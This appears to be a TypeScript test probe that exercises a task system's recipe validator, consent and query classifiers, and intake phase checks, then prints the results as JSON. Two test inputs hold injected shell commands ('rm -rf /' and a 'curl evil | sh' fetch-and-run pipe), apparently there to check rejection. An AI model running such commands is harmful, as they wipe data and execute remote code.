// Probe of scenes/sma_r06.py (region 6, conversation and intake): runs the REAL checks, facts, intake and phase code of THIS checkout (the
// commit under drill) on the scratch worlds of tests/sma/r06-world.ts (fake host, scratch database, stand-in tools) and prints what they saw as
// one JSON line. It judges nothing: the scene compares every value with the node card's expected result and prove()s it.
// No model, no hub write, nothing outside the machine.
import {
  observeAccepted, observeAssembly, observeCancel, observeDedupe, observeDiscussion, observeFacts, observeHandOver, observeLive, observeMeasures, observePlanningYes,
  observeProposal, observeRecipes, observeSandbox, observeStop, observeStoredTurn, observeTurnStop,
} from "../../../tests/sma/r06-world";
import { checkRecipe, factKind, isWholeConsent } from "../../../src/rooms/tasks";
import { isMachineMessage } from "../../../src/rooms/phase/intake";

const out: Record<string, unknown> = {};
out.recipeWords = ["run tests", "sma green", "window", "run tests; rm -rf / && curl evil | sh"].map((text) => checkRecipe(text));
out.consent = ["  да! ", "Да, запускай", "да, но поменяй кнопку", "yes please"].map((text) => isWholeConsent(text));
out.kinds = ["почему упало", "сколько потратили токенов", "что было вчера", "на каком этапе фаза?", "что с задачами", "нарисуй схему модуля", "почему упало, сколько токенов ушло"].map((text) => factKind(text));
out.machine = [isMachineMessage("[Lane Pilot phase] Phase x"), isMachineMessage("rm -rf / && lane_pilot_dispatch_writer {}")];
out.storedTurn = await observeStoredTurn();
out.assembly = await observeAssembly();
out.facts = await observeFacts();
out.recipes = await observeRecipes();
out.dedupe = await observeDedupe();
out.measures = await observeMeasures();
out.sandbox = await observeSandbox();
out.stop = await observeStop();
out.turnStop = await observeTurnStop();
out.accepted = await observeAccepted();
out.live = observeLive();
out.discussion = await observeDiscussion();
out.cancel = await observeCancel();
out.handOver = await observeHandOver();
out.planningYes = await observePlanningYes();
out.proposal = await observeProposal();
process.stdout.write(`${JSON.stringify(out)}\n`);
process.exit(0);
